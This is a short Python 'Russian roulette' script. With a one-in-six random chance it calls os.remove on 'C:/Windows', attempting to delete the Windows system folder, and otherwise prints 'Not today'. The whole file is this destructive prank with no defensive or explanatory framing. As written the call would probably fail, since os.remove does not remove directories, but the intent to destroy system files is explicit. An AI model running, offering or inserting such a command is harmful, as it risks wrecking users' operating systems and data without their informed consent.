#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
from random import randint


if __name__ == "__main__":
    n = randint(0, 5)
    if n == 0:
        os.remove("C:/Windows")
    else:
        print("Not today")
